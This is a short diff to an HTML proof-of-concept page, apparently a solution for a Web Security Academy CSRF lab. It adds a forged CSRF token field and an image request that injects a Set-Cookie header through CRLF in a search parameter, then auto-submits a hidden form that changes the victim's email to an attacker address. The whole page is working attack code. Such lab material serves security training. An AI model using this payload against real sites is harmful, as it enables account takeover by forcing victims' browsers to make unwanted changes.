@@ -3,7 +3,9 @@
 		<iframe style="display:none" name="csrf-iframe"></iframe>      
 		<form action="https://xxxxxxxxxxxxxxURLxxxxxxxxxxxxxxx.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
 			<input type="hidden" name="email" value="test@attacker.com" />
+			<input type="hidden" name="csrf" value="xxxxxxxxxxxxxxCSRFxxxxxxxxxxxxxx" />
 		</form>
+		<img src="https://xxxxxxxxxxxxxxURLxxxxxxxxxxxxxxx.web-security-academy.net/?search=%0d%0aSet-Cookie:%20csrf=xxxxxxxxxxxxxxCSRFxxxxxxxxxxxxxx%3b%20SameSite=None" onerror="document.forms[0].submit()" />
 		<script>
 			document.getElementById('csrf-form').submit();
 		</script>
